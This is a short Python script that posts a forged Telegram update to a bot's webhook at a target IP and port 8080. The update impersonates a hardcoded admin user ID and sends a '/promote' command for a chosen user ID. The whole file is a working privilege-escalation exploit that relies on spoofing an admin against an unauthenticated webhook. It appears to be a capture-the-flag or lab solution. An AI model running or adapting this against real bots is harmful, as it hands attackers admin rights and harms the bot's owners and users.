import requests
import sys

IP = sys.argv[1].strip()
ID_TO_PROMOTE = sys.argv[2].strip()

ADMIN_ID = 6698983417

r = requests.post(
    url=f"http://{IP}:8080/webhook",
    json={
        "update_id": 999999999,
        "message": {
            "message_id": 999999999,
            "from": {
                "id": ADMIN_ID,
                "is_bot": False,
                "first_name": "",
                "last_name": "",
                "username": "",
            },
            "chat": {
                "id": ADMIN_ID,
                "first_name": "",
                "last_name": "",
                "username": "",
                "type": "private",
            },
            "date": 999999999,
            "text": f"/promote {ID_TO_PROMOTE}",
        },
    },
)

print(r.text)
